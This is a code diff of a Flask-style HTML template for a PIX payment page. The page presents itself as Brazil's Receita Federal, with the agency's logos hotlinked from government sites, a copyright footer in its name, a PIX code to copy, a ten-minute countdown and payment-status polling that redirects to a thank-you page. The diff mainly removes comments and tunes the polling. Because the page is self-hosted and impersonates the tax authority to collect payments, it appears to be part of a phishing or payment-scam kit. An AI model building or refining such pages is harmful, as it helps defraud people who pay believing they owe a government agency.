@@ -14,7 +14,6 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* Keep all existing styles unchanged */
         @font-face {
             font-family: 'Rawline';
             src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
@@ -163,14 +162,11 @@
             margin-top: 10px;
             line-height: 1.4;
         }
-
         @keyframes pulse {
             0% { box-shadow: 0 0 0 0 rgba(220, 53, 69, 0.4); }
             70% { box-shadow: 0 0 0 10px rgba(220, 53, 69, 0); }
             100% { box-shadow: 0 0 0 0 rgba(220, 53, 69, 0); }
         }
-
-        /* Loading screen styles */
         .loading-screen {
             position: fixed;
             top: 0;
@@ -216,7 +212,6 @@
     </style>
 </head>
 <body>
-    <!-- Header -->
     <div class="header">
         <img alt="Logo da Receita Federal" class="logo" src="https://servicos.receitafederal.gov.br/assets/images/receitaAzul.svg"/>
         <div class="header-icons">
@@ -226,13 +221,11 @@
         </div>
     </div>
 
-    <!-- Loading Screen -->
     <div class="loading-screen" id="loadingScreen">
         <div class="loading-spinner"></div>
         <p style="font-size: 18px; color: #333;">Gerando transação PIX...</p>
     </div>
 
-    <!-- Main Content (initially hidden) -->
     <div class="content" id="mainContent">
         <div class="container">
             <div class="payment-info">
@@ -271,7 +264,6 @@
         </div>
     </div>
 
-    <!-- Footer -->
     <footer class="footer">
         <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" alt="Receita Federal Logo" class="footer-logo">
         <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
@@ -279,31 +271,21 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            let statusChecker;
-            let redirected = false;
-
             function checkStatus() {
-                if (redirected) return;
-
                 fetch('/check-payment-status/{{ transaction_id }}')
                 .then(response => response.text())
                 .then(text => {
-                    console.log('[DEBUG] Status check response:', text);
-                    if (text.includes('APPROVED')) {
-                        console.log('[DEBUG] APPROVED detectado - Redirecionando');
-                        redirected = true;
-                        clearInterval(statusChecker);
+                    console.log("[DEBUG] Resposta:", text);
+                    if (text.includes('"status":"APPROVED"')) {
                         window.location.href = '/obrigado';
                     }
-                })
-                .catch(error => console.error('[DEBUG] Erro:', error));
+                });
             }
 
-            // Verifica status a cada 50ms
-            statusChecker = setInterval(checkStatus, 50);
-            checkStatus(); // Primeira verificação
+            // Verifica a cada 1 segundo
+            setInterval(checkStatus, 1000);
 
-            // Timer e outras funcionalidades não críticas
+            // Timer de 10 minutos
             let timeLeft = 600;
             setInterval(() => {
                 document.getElementById('timer').textContent = 
@@ -311,11 +293,13 @@
                 if (timeLeft-- <= 0) window.location.href = '/';
             }, 1000);
 
+            // Mostra conteúdo após 1.5s
             setTimeout(() => {
                 document.getElementById('loadingScreen').style.display = 'none';
                 document.getElementById('mainContent').style.display = 'block';
             }, 1500);
 
+            // Função para copiar código PIX
             window.copyPixCode = function() {
                 let button = document.querySelector('.copy-button');
                 navigator.clipboard.writeText(document.getElementById('pixCode').textContent.trim())
